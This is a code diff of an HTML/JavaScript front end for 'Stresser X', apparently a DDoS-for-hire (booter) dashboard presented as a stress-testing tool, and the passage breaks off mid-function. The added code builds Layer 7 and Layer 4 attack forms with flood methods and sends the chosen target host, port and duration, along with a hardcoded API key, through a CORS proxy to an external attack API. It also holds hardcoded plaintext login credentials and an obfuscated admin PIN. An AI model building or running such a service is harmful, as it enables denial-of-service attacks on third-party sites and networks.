@@ -3,18 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' [invalid url, do not cite]">
-    <title>Stresser Dashboard</title>
-    <link href="[invalid url, do not cite]" rel="stylesheet">
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
+    <title>Stresser X - Advanced Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg: #1a202c;
-            --panel-bg: #2d3748;
-            --accent: #4299e1;
-            --text: #ffffff;
-            --text-secondary: #e2e8f0;
-            --border: #4a5568;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            --primary-bg: #0d1117;
+            --panel-bg: #161b22;
+            --accent: #58a6ff;
+            --accent-hover: #79c0ff;
+            --text: #c9d1d9;
+            --text-secondary: #8b949e;
+            --border: #30363d;
+            --shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+            --success: #238636;
+            --error: #f85149;
+            --warning: #d29922;
         }
 
         * {
@@ -24,82 +29,121 @@
         }
 
         body {
-            background: var(--bg);
+            background: linear-gradient(135deg, var(--primary-bg) 0%, #21262d 100%);
             color: var(--text);
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
-            padding: 2rem;
+            align-items: flex-start;
+            padding: 2.5rem;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1500px;
             width: 100%;
             display: grid;
-            grid-template-columns: 3fr 1fr;
-            gap: 2rem;
+            grid-template-columns: 2.5fr 1fr;
+            gap: 2.5rem;
+            position: relative;
         }
 
         .panel {
             background: var(--panel-bg);
-            padding: 2.5rem;
-            border-radius: 12px;
+            border-radius: 16px;
+            padding: 3rem;
             box-shadow: var(--shadow);
-            transition: opacity 0.4s ease, transform 0.4s ease;
+            transition: transform 0.4s ease, opacity 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), transparent);
         }
 
         h1 {
-            font-size: 2rem;
+            font-size: 2.2rem;
             font-weight: 700;
             color: var(--accent);
             margin-bottom: 2rem;
             text-align: center;
+            letter-spacing: 0.5px;
         }
 
         h2 {
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             font-weight: 600;
             color: var(--accent);
             margin-bottom: 1.5rem;
+            text-transform: uppercase;
         }
 
         .hidden {
             display: none;
             opacity: 0;
-            transform: translateY(10px);
+            transform: translateY(20px);
         }
 
         .tabs {
             display: flex;
-            gap: 0.75rem;
-            margin-bottom: 2rem;
-            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2.5rem;
             justify-content: center;
+            flex-wrap: wrap;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 0.5rem;
+            border-radius: 12px;
         }
 
         .tab {
-            padding: 0.75rem 2rem;
+            padding: 0.8rem 2rem;
             background: var(--border);
             color: var(--text);
             border-radius: 8px;
             cursor: pointer;
             font-weight: 500;
-            transition: background 0.3s ease, transform 0.3s ease;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .tab::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            transition: width 0.3s ease;
+        }
+
+        .tab:hover::after {
+            width: 100%;
         }
 
         .tab.active {
             background: var(--accent);
+            color: #fff;
             transform: translateY(-2px);
         }
 
         .tab:hover {
-            background: #5a6b8a;
+            background: var(--accent-hover);
+            color: #fff;
             transform: translateY(-2px);
         }
 
         .form-group {
-            margin-bottom: 1.75rem;
+            margin-bottom: 2rem;
             position: relative;
         }
 
@@ -107,151 +151,231 @@
             font-size: 0.95rem;
             font-weight: 500;
             color: var(--text-secondary);
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.75rem;
             display: block;
+            transition: color 0.3s ease;
         }
 
         input, select {
             width: 100%;
-            padding: 0.85rem;
+            padding: 1rem;
             border: 1px solid var(--border);
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 1rem;
             color: var(--text);
-            background: #3b4a5e;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            background: #21262d;
+            transition: all 0.3s ease;
         }
 
         input:focus, select:focus {
             outline: none;
             border-color: var(--accent);
-            box-shadow: 0 0 0 2px rgba(66, 153, 225, 0.3);
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.2);
+            background: #2a3038;
         }
 
         select {
             appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='[invalid url, do not cite]' fill='%234299e1' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%2358a6ff' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
-            background-position: right 0.85rem center;
-            background-size: 1.1rem;
+            background-position: right 1rem center;
+            background-size: 1.2rem;
         }
 
         button {
             width: 100%;
-            padding: 0.85rem;
+            padding: 1rem;
             background: var(--accent);
-            color: var(--text);
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            font-size: 1rem;
+            border-radius: 10px;
+            font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+
+        button:hover::before {
+            left: 100%;
         }
 
         button:hover {
             transform: scale(1.05);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+            background: var(--accent-hover);
+            box-shadow: 0 6px 20px rgba(88, 166, 255, 0.3);
         }
 
         #errorMessage, #adminErrorMessage {
             text-align: center;
             font-size: 0.95rem;
-            margin-top: 1rem;
-            color: #f56565;
+            margin-top: 1.5rem;
+            color: var(--error);
+            font-weight: 500;
             transition: opacity 0.3s ease;
         }
 
         .sidebar {
             background: var(--panel-bg);
-            padding: 2rem;
-            border-radius: 12px;
+            padding: 2.5rem;
+            border-radius: 16px;
             box-shadow: var(--shadow);
             position: sticky;
-            top: 2rem;
-            animation: fadeIn 0.5s ease-in;
+            top: 2.5rem;
+            animation: slideIn 0.5s ease-in-out;
         }
 
         .sidebar p {
-            margin-bottom: 0.85rem;
+            margin-bottom: 1rem;
             font-size: 0.95rem;
             color: var(--text-secondary);
+            line-height: 1.5;
         }
 
         #attackTimer {
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             font-weight: 600;
             color: var(--accent);
-            margin-top: 1.25rem;
+            margin-top: 1.5rem;
+            text-align: center;
         }
 
         .progress-bar {
             width: 100%;
-            height: 10px;
+            height: 12px;
             background: var(--border);
-            border-radius: 5px;
+            border-radius: 6px;
             overflow: hidden;
+            margin-top: 1rem;
         }
 
         .progress-bar div {
             height: 100%;
-            background: var(--accent);
-            transition: width 0.6s ease;
+            background: linear-gradient(90deg, var(--accent), var(--accent-hover));
+            transition: width 0.7s ease-in-out;
         }
 
         .admin-content {
-            padding: 1.25rem;
-            background: #3b4a5e;
-            border-radius: 8px;
+            padding: 1.5rem;
+            background: #21262d;
+            border-radius: 10px;
+            margin-top: 1rem;
         }
 
         .admin-content table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 1.25rem;
+            margin-top: 1.5rem;
         }
 
         .admin-content th, .admin-content td {
-            padding: 0.75rem;
+            padding: 1rem;
             text-align: left;
             border-bottom: 1px solid var(--border);
+            font-size: 0.95rem;
         }
 
         .admin-content th {
             color: var(--accent);
             font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .admin-content td button {
+            padding: 0.5rem 1rem;
+            font-size: 0.9rem;
         }
 
         .tab-content {
-            transition: opacity 0.4s ease, transform 0.4s ease;
-        }
-
-        .tab-content.hidden {
-            opacity: 0;
-            transform: translateY(10px);
-            display: none;
+            animation: fadeIn 0.5s ease-in-out;
         }
 
         .overview-content, .history-content, .settings-content {
-            padding: 1.25rem;
-            background: #3b4a5e;
-            border-radius: 8px;
+            padding: 1.5rem;
+            background: #21262d;
+            border-radius: 10px;
+            margin-top: 1rem;
         }
 
         .overview-content p, .history-content p, .settings-content p {
             margin-bottom: 1rem;
             color: var(--text-secondary);
             font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+
+        .status-active {
+            background: var(--success);
+        }
+
+        .status-inactive {
+            background: var(--error);
+        }
+
+        .status-operational {
+            background: var(--success);
+        }
+
+        .tooltip {
+            position: relative;
+        }
+
+        .tooltip .tooltip-text {
+            visibility: hidden;
+            width: 200px;
+            background: var(--panel-bg);
+            color: var(--text);
+            text-align: center;
+            padding: 0.5rem;
+            border-radius: 6px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .tooltip:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(20px); }
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(30px); }
             to { opacity: 1; transform: translateX(0); }
         }
 
-        @media (max-width: 1024px) {
+        @media (max-width: 1200px) {
             .container {
                 grid-template-columns: 1fr;
+                gap: 2rem;
             }
             .sidebar {
                 position: static;
@@ -266,13 +390,35 @@
             .tab {
                 width: 100%;
                 text-align: center;
-                padding: 0.65rem 1.25rem;
+                padding: 0.75rem;
             }
             .panel {
-                padding: 1.75rem;
+                padding: 2rem;
             }
             input, select, button {
                 font-size: 0.95rem;
+                padding: 0.85rem;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .panel {
+                padding: 1.5rem;
+            }
+            .tabs {
+                gap: 0.5rem;
+            }
+            .tab {
+                padding: 0.65rem;
+                font-size: 0.9rem;
+            }
+            input, select, button {
                 padding: 0.75rem;
             }
         }
@@ -282,7 +428,7 @@
     <div class="container">
         <div class="main-content">
             <div id="loginPanel" class="panel">
-                <h1>Login</h1>
+                <h1>Stresser X - Login</h1>
                 <div class="form-group">
                     <label for="username">Username</label>
                     <input type="text" id="username" placeholder="Enter username" required>
@@ -293,7 +439,7 @@
                 </div>
                 <button id="loginButton">Log In</button>
                 <p id="errorMessage" class="hidden"></p>
-                <p style="text-align: center; margin-top: 1.25rem; font-size: 0.95rem; color: var(--text-secondary);">
+                <p style="text-align: center; margin-top: 1.5rem; font-size: 0.95rem; color: var(--text-secondary);">
                     Total Visits: <span id="visitCount">0</span>
                 </p>
             </div>
@@ -307,23 +453,47 @@
                 <p id="adminErrorMessage" class="hidden"></p>
             </div>
             <div id="mainPanel" class="panel hidden">
-                <h1>Stresser Dashboard</h1>
+                <h1>Stresser X Dashboard</h1>
                 <div class="tabs">
-                    <button id="tab-overview" class="tab active">Overview</button>
-                    <button id="tab-layer7" class="tab">Layer 7</button>
-                    <button id="tab-layer4" class="tab">Layer 4</button>
-                    <button id="tab-history" class="tab">History</button>
-                    <button id="tab-settings" class="tab">Settings</button>
-                    <button id="tab-admin" class="tab">Admin</button>
+                    <button id="tab-overview" class="tab active tooltip">
+                        Overview
+                        <span class="tooltip-text">View dashboard overview</span>
+                    </button>
+                    <button id="tab-layer7" class="tab tooltip">
+                        Layer 7
+                        <span class="tooltip-text">Configure Layer 7 tests</span>
+                    </button>
+                    <button id="tab-layer4" class="tab tooltip">
+                        Layer 4
+                        <span class="tooltip-text">Configure Layer 4 tests</span>
+                    </button>
+                    <button id="tab-history" class="tab tooltip">
+                        History
+                        <span class="tooltip-text">View test history</span>
+                    </button>
+                    <button id="tab-settings" class="tab tooltip">
+                        Settings
+                        <span class="tooltip-text">Manage user settings</span>
+                    </button>
+                    <button id="tab-admin" class="tab tooltip">
+                        Admin
+                        <span class="tooltip-text">Access admin controls</span>
+                    </button>
                 </div>
                 <div id="overview" class="tab-content overview-content">
-                    <p>Welcome to the Stresser Dashboard. Monitor active tests, manage settings, and access advanced controls.</p>
+                    <h2>Overview</h2>
+                    <p>Welcome to Stresser X, the ultimate platform for stress testing.</p>
                     <p>Active Tests: <span id="activeAttacks">0</span></p>
                     <p>User Plan: <span id="userPlan">Bronze</span></p>
                     <p>Last Login: <span id="lastLogin">N/A</span></p>
-                    <p>System Status: <span id="systemStatus">Operational</span></p>
+                    <p>System Status: <span id="systemStatus">Operational</span> <span class="status-indicator status-operational"></span></p>
+                    <div class="overview-stats">
+                        <p>Total Tests Run: <span id="totalTests">0</span></p>
+                        <p>Success Rate: <span id="successRate">100%</span></p>
+                    </div>
                 </div>
                 <div id="layer7" class="tab-content hidden">
+                    <h2>Layer 7 Test</h2>
                     <div class="form-group">
                         <label for="hostL7">Host (URL or IP)</label>
                         <input type="text" id="hostL7" placeholder="e.g., example.com or 192.168.1.1" required>
@@ -352,6 +522,7 @@
                     <button onclick="startTest('L7')">Start Test</button>
                 </div>
                 <div id="layer4" class="tab-content hidden">
+                    <h2>Layer 4 Test</h2>
                     <div class="form-group">
                         <label for="hostL4">Host (URL or IP)</label>
                         <input type="text" id="hostL4" placeholder="e.g., example.com or 192.168.1.1" required>
@@ -397,18 +568,19 @@
                     <button onclick="startTest('L4')">Start Test</button>
                 </div>
                 <div id="history" class="tab-content hidden history-content">
+                    <h2>Test History</h2>
                     <p>Test history will be available after backend integration.</p>
-                    <p>No records found.</p>
                     <table>
                         <thead>
-                            <tr><th>Date</th><th>Host</th><th>Status</th></tr>
+                            <tr><th>Date</th><th>Host</th><th>Method</th><th>Status</th></tr>
                         </thead>
                         <tbody>
-                            <tr><td>-</td><td>-</td><td>-</td></tr>
+                            <tr><td>-</td><td>-</td><td>-</td><td>-</td></tr>
                         </tbody>
                     </table>
                 </div>
                 <div id="settings" class="tab-content hidden settings-content">
+                    <h2>Settings</h2>
                     <div class="form-group">
                         <label for="themeToggle">Theme</label>
                         <select id="themeToggle">
@@ -427,6 +599,13 @@
                             <option value="off">Off</option>
                         </select>
                     </div>
+                    <div class="form-group">
+                        <label for="languageSelect">Language</label>
+                        <select id="languageSelect">
+                            <option value="pl">Polski</option>
+                            <option value="en">English</option>
+                        </select>
+                    </div>
                     <button onclick="saveSettings()">Save Settings</button>
                 </div>
                 <div id="admin" class="tab-content hidden">
@@ -438,12 +617,27 @@
                                 <tr><th>ID</th><th>Username</th><th>Status</th><th>Actions</th></tr>
                             </thead>
                             <tbody>
-                                <tr><td>USR001</td><td>admin</td><td>Active</td><td><button>Deactivate</button></td></tr>
-                                <tr><td>USR002</td><td>user1</td><td>Inactive</td><td><button>Activate</button></td></tr>
-                                <tr><td>USR003</td><td>user2</td><td>Active</td><td><button>Deactivate</button></td></tr>
+                                <tr>
+                                    <td>USR001</td>
+                                    <td>admin</td>
+                                    <td><span class="status-indicator status-active"></span>Active</td>
+                                    <td><button onclick="toggleUserStatus('USR001')">Deactivate</button></td>
+                                </tr>
+                                <tr>
+                                    <td>USR002</td>
+                                    <td>user1</td>
+                                    <td><span class="status-indicator status-inactive"></span>Inactive</td>
+                                    <td><button onclick="toggleUserStatus('USR002')">Activate</button></td>
+                                </tr>
+                                <tr>
+                                    <td>USR003</td>
+                                    <td>user2</td>
+                                    <td><span class="status-indicator status-active"></span>Active</td>
+                                    <td><button onclick="toggleUserStatus('USR003')">Deactivate</button></td>
+                                </tr>
                             </tbody>
                         </table>
-                        <p>Server Status: <span id="serverStatus">Operational</span></p>
+                        <p>Server Status: <span id="serverStatus">Operational</span> <span class="status-indicator status-operational"></span></p>
                         <p>Active Users: <span id="activeUsers">2</span></p>
                         <button onclick="refreshAdminData()">Refresh Data</button>
                     </div>
@@ -462,7 +656,6 @@
         </div>
     </div>
     <script>
-        // Secure JavaScript with light obfuscation
         (function() {
             const _0x1a2b = {
                 _0x3c4d: btoa('X7P9Q2').split('').reverse().join(''),
@@ -471,12 +664,18 @@
                     { username: 'user1', password: 'pass123' },
                     { username: 'user2', password: 'test456' }
                 ],
-                _0x7b8c: new Date().toISOString()
+                _0x7b8c: new Date().toISOString(),
+                _0x9d0e: {
+                    'USR001': 'active',
+                    'USR002': 'inactive',
+                    'USR003': 'active'
+                }
             };
             const _0xc3d4 = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
-            const _0xe5f6 = '[invalid url, do not cite]';
+            const _0xe5f6 = 'https://api.santastress.ru/api/start';
             let _0xg7h8 = null;
             let _0xi9j0 = 0;
+            let _0xk1l2 = 0;
 
             // Visit counter
             let _0xv1w2 = parseInt(localStorage.getItem('_0xv1w2') || '0');
@@ -490,43 +689,45 @@
                 if (_0xu1v2) {
                     _0xu1v2.textContent = _0xq7r8;
                     _0xu1v2.classList.remove('hidden');
-                    _0xu1v2.style.color = _0xs9t0 ? '#68d391' : '#f56565';
+                    _0xu1v2.style.color = _0xs9t0 ? '#238636' : '#f85149';
                     console.log('Message:', _0xq7r8);
-                    if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2000);
+                    if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2500);
                 }
             };
 
             // Login handler
             function handleLogin() {
-                console.log('Login attempt');
+                console.log('Login attempt at', new Date().toISOString());
                 const _0xw3x4 = document.getElementById('username')?.value.trim();
                 const _0xy5z6 = document.getElementById('password')?.value.trim();
-                if (!_0xw3x4 || !_0xy5z6) return showMessage('All fields are required');
+                if (!_0xw3x4 || !_0xy5z6) return showMessage('Wszystkie pola są wymagane');
                 const _0xa7b8 = _0x1a2b._0x5e6f.find(_0xc9d0 => _0xc9d0.username === _0xw3x4 && _0xc9d0.password === _0xy5z6);
                 if (_0xa7b8) {
                     document.getElementById('loginPanel').classList.add('hidden');
                     document.getElementById('mainPanel').classList.remove('hidden');
-                    showMessage('Logged in successfully', true);
+                    showMessage('Zalogowano pomyślnie', true);
                     document.getElementById('lastLogin').textContent = _0x1a2b._0x7b8c;
                     _0xi9j0++;
                     document.getElementById('activeAttacks').textContent = _0xi9j0;
+                    document.getElementById('totalTests').textContent = _0xk1l2;
                 } else {
-                    showMessage('Invalid username or password');
+                    showMessage('Nieprawidłowa nazwa użytkownika lub hasło');
                 }
             }
 
             // Admin PIN verification
             const getPin = () => atob(_0x1a2b._0x3c4d.split('').reverse().join(''));
             function verifyAdminPin() {
-                console.log('Admin PIN attempt');
+                console.log('Admin PIN attempt at', new Date().toISOString());
                 const _0xe1f2 = document.getElementById('adminPin')?.value.trim();
-                if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('6-character PIN required');
+                if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('Wymagany 6-znakowy PIN');
                 if (_0xe1f2 === getPin()) {
                     document.getElementById('adminLoginPanel').classList.add('hidden');
                     document.getElementById('adminContent').classList.remove('hidden');
-                    showMessage('Admin access granted', true);
+                    showMessage('Dostęp administratora przyznany', true);
+                    updateAdminPanel();
                 } else {
-                    showMessage('Invalid PIN');
+                    showMessage('Nieprawidłowy PIN');
                 }
             }
 
@@ -544,19 +745,278 @@
                         document.getElementById('adminContent').classList.add('hidden');
                     }
                 });
+                console.log('Switched to tab:', _0xg3h4);
             }
 
             // Form validation
             function validateForm(_0xo1p2, _0xq3r4, _0xs5t6, _0xu7v8, _0xw9x0) {
-                if (!_0xo1p2) return showMessage('Host is required'), false;
-                if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port must be 1-65535'), false;
-                if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Duration must be 1-200 seconds'), false;
-                if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Connections must be 1-4'), false;
-                if (!_0xw9x0) return showMessage('Method is required'), false;
+                if (!_0xo1p2) return showMessage('Host jest wymagany'), false;
+                if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port musi być w zakresie 1-65535'), false;
+                if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Czas trwania musi być w zakresie 1-200 sekund'), false;
+                if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Liczba połączeń musi być w zakresie 1-4'), false;
+                if (!_0xw9x0) return showMessage('Metoda jest wymagana'), false;
                 return true;
             }
 
             // Attack handler
             async function startTest(_0xy1z2) {
-                if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Invalid API key');
-                const _0xa3b4 = document
+                if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Nieprawidłowy klucz API');
+                const _0xa3b4 = document.getElementById(`host${_0xy1z2}`)?.value.trim();
+                const _0xc5d6 = parseInt(document.getElementById(`port${_0xy1z2}`)?.value);
+                const _0xe7f8 = parseInt(document.getElementById(`time${_0xy1z2}`)?.value);
+                const _0xg9h0 = document.getElementById(`method${_0xy1z2}`)?.value;
+                const _0xi1j2 = parseInt(document.getElementById(`concs${_0xy1z2}`)?.value);
+                if (!validateForm(_0xa3b4, _0xc5d6, _0xe7f8, _0xi1j2, _0xg9h0)) return;
+                const _0xk3l4 = `https://api.allorigins.win/raw?url=${encodeURIComponent(`${_0xe5f6}?key=${encodeURIComponent(_0xc3d4)}&host=${encodeURIComponent(_0xa3b4)}&port=${_0xc5d6}&time=${_0xe7f8}&method=${encodeURIComponent(_0xg9h0)}&concs=${_0xi1j2}`)}`;
+                console.log('API request:', _0xk3l4);
+                try {
+                    const _0xm5n6 = await fetch(_0xk3l4);
+                    if (!_0xm5n6.ok) throw new Error('Błąd sieci: ' + _0xm5n6.status);
+                    const _0xo7p8 = await _0xm5n6.json();
+                    console.log('API response:', _0xo7p8);
+                    showMessage('Test rozpoczęty', true);
+                    _0xk1l2++;
+                    document.getElementById('totalTests').textContent = _0xk1l2;
+                    updateAttack(_0xa3b4, _0xc5d6, _0xe7f8, _0xg9h0, _0xi1j2);
+                } catch (_0xq9r0) {
+                    console.error('Error:', _0xq9r0);
+                    showMessage('Test nieudany: ' + _0xq9r0.message);
+                }
+            }
+
+            // Update attack sidebar
+            function updateAttack(_0xs1t2, _0xu3v4, _0xw5x6, _0xy7z8, _0xa9b0) {
+                const _0xc1d2 = document.getElementById('attackPanel');
+                if (!_0xc1d2) return console.error('Sidebar not found');
+                document.getElementById('attackHost').textContent = _0xs1t2;
+                document.getElementById('attackPort').textContent = _0xu3v4;
+                document.getElementById('attackTime').textContent = _0xw5x6 + 's';
+                document.getElementById('attackMethod').textContent = _0xy7z8;
+                document.getElementById('attackConcs').textContent = _0xa9b0;
+                let _0xe3f4 = _0xw5x6;
+                document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
+                const _0xg5h6 = document.getElementById('progressBar');
+                if (!_0xg5h6) return console.error('Progress bar not found');
+                _0xg5h6.style.width = '100%';
+                _0xc1d2.classList.remove('hidden');
+                if (_0xg7h8) clearInterval(_0xg7h8);
+                _0xg7h8 = setInterval(() => {
+                    _0xe3f4--;
+                    document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
+                    _0xg5h6.style.width = `${(_0xe3f4 / _0xw5x6) * 100}%`;
+                    if (_0xe3f4 <= 0) {
+                        clearInterval(_0xg7h8);
+                        _0xg7h8 = null;
+                        _0xc1d2.classList.add('hidden');
+                        _0xg5h6.style.width = '0%';
+                        showMessage('Test zakończony', true);
+                    }
+                }, 1000);
+            }
+
+            // Admin panel update
+            function updateAdminPanel() {
+                const _0xm3n4 = document.querySelector('#adminContent tbody');
+                if (!_0xm3n4) return;
+                _0xm3n4.innerHTML = '';
+                Object.keys(_0x1a2b._0x9d0e).forEach(_0xo5p6 => {
+                    const _0xq7r8 = document.createElement('tr');
+                    _0xq7r8.innerHTML = `
+                        <td>${_0xo5p6}</td>
+                        <td>${_0x1a2b._0x5e6f.find(_0xs9t0 => _0xs9t0.username === _0xo5p6.split('USR')[1].padStart(3, '0'))?.username || 'unknown'}</td>
+                        <td><span class="status-indicator status-${_0x1a2b._0x9d0e[_0xo5p6]}"></span>${_0x1a2b._0x9d0e[_0xo5p6].charAt(0).toUpperCase() + _0x1a2b._0x9d0e[_0xo5p6].slice(1)}</td>
+                        <td><button onclick="toggleUserStatus('${_0xo5p6}')">${_0x1a2b._0x9d0e[_0xo5p6] === 'active' ? 'Deactivate' : 'Activate'}</button></td>
+                    `;
+                    _0xm3n4.appendChild(_0xq7r8);
+                });
+                document.getElementById('activeUsers').textContent = Object.values(_0x1a2b._0x9d0e).filter(_0xu1v2 => _0xu1v2 === 'active').length;
+            }
+
+            // Toggle user status
+            function toggleUserStatus(_0xw3x4) {
+                _0x1a2b._0x9d0e[_0xw3x4] = _0x1a2b._0x9d0e[_0xw3x4] === 'active' ? 'inactive' : 'active';
+                showMessage(`User ${_0xw3x4} status updated`, true);
+                updateAdminPanel();
+            }
+
+            // Save settings
+            function saveSettings() {
+                const _0xy5z6 = document.getElementById('apiKey')?.value.trim();
+                const _0xa7b8 = document.getElementById('themeToggle')?.value;
+                const _0xc9d0 = document.getElementById('notificationToggle')?.value;
+                const _0xe1f2 = document.getElementById('languageSelect')?.value;
+                if (!_0xy5z6 || _0xy5z6.length !== 64) return showMessage('Nieprawidłowy klucz API');
+                console.log('Settings saved:', { apiKey: _0xy5z6, theme: _0xa7b8, notifications: _0xc9d0, language: _0xe1f2 });
+                showMessage('Ustawienia zapisane', true);
+            }
+
+            // Refresh admin data
+            function refreshAdminData() {
+                showMessage('Dane administratora odświeżone', true);
+                updateAdminPanel();
+            }
+
+            // Event listeners
+            document.addEventListener('DOMContentLoaded', () => {
+                console.log('System initialized at', new Date().toISOString());
+                document.getElementById('loginButton')?.addEventListener('click', handleLogin);
+                document.getElementById('adminLoginButton')?.addEventListener('click', verifyAdminPin);
+                document.getElementById('password')?.addEventListener('keypress', _0xg3h4 => {
+                    if (_0xg3h4.key === 'Enter') handleLogin();
+                });
+                document.getElementById('adminPin')?.addEventListener('keypress', _0xi5j6 => {
+                    if (_0xi5j6.key === 'Enter') verifyAdminPin();
+                });
+                ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xk7l8 => {
+                    document.getElementById(`tab-${_0xk7l8}`)?.addEventListener('click', () => switchTab(_0xk7l8));
+                });
+                // Initialize admin panel
+                updateAdminPanel();
+            });
+
+            // Additional validation for inputs
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(_0xm9n0 => {
+                _0xm9n0.addEventListener('input', () => {
+                    if (_0xm9n0.value.trim()) {
+                        _0xm9n0.classList.add('filled');
+                    } else {
+                        _0xm9n0.classList.remove('filled');
+                    }
+                });
+            });
+
+            // Mock history data
+            const mockHistory = [
+                { date: '2025-06-25 10:00:00', host: 'example.com', method: 'httpsbypass', status: 'Completed' },
+                { date: '2025-06-24 15:30:00', host: 'test.org', method: 'udpflood', status: 'Failed' }
+            ];
+
+            function updateHistoryTable() {
+                const _0xo7p8 = document.querySelector('#history tbody');
+                if (!_0xo7p8) return;
+                _0xo7p8.innerHTML = '';
+                mockHistory.forEach(_0xq9r0 => {
+                    const _0xs1t2 = document.createElement('tr');
+                    _0xs1t2.innerHTML = `
+                        <td>${_0xq9r0.date}</td>
+                        <td>${_0xq9r0.host}</td>
+                        <td>${_0xq9r0.method}</td>
+                        <td><span class="status-indicator status-${_0xq9r0.status.toLowerCase()}"></span>${_0xq9r0.status}</td>
+                    `;
+                    _0xo7p8.appendChild(_0xs1t2);
+                });
+            }
+
+            // Initialize history table
+            updateHistoryTable();
+
+            // Input animations
+            const animateInputs = () => {
+                inputs.forEach(_0xu3v4 => {
+                    _0xu3v4.addEventListener('focus', () => {
+                        _0xu3v4.parentElement.querySelector('label').style.color = 'var(--accent)';
+                    });
+                    _0xu3v4.addEventListener('blur', () => {
+                        _0xu3v4.parentElement.querySelector('label').style.color = 'var(--text-secondary)';
+                    });
+                });
+            };
+            animateInputs();
+
+            // Dynamic system status
+            function updateSystemStatus() {
+                const _0xw5x6 = document.getElementById('systemStatus');
+                if (_0xw5x6) {
+                    _0xw5x6.textContent = 'Operational';
+                }
+            }
+            updateSystemStatus();
+
+            // Periodic status check (mock)
+            setInterval(() => {
+                updateSystemStatus();
+                console.log('System status checked at', new Date().toISOString());
+            }, 60000);
+
+            // Input validation for numbers
+            const numberInputs = document.querySelectorAll('input[type="number"]');
+            numberInputs.forEach(_0xy7z8 => {
+                _0xy7z8.addEventListener('input', () => {
+                    if (_0xy7z8.value < _0xy7z8.min || _0xy7z8.value > _0xy7z8.max) {
+                        _0xy7z8.style.borderColor = 'var(--error)';
+                    } else {
+                        _0xy7z8.style.borderColor = 'var(--border)';
+                    }
+                });
+            });
+
+            // Theme toggle (mock)
+            document.getElementById('themeToggle')?.addEventListener('change', (_0xa9b0) => {
+                if (_0xa9b0.target.value === 'light') {
